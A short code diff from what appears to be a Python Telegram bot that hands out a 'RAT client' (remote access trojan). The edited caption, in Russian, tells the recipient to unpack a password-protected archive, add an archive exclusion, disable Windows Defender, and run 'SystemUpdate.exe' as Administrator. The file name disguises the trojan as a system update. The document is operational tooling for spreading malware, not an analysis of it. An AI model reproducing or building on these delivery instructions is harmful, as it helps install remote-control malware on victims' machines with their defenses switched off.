@@ -407,7 +407,7 @@ def cb_get_rat_exe(call):
             caption="🦠 <b>Ваш RAT-клиент</b>\n\n"
                     "<b>Инструкция:</b>\n"
                     "1. Скачайте архив и распакуйте (пароль: <code>123</code>).\n"
-                    "2. Отключите антивирус (Windows Defender).\n"
+                    "2. перед распоковкой файла добавьте разрешение .zip/.7z Отключите антивирус (Windows Defender).\n"
                     "3. Запустите <code>SystemUpdate.exe</code> от имени Администратора."
         )
         bot.delete_message(call.from_user.id, msg.message_id)
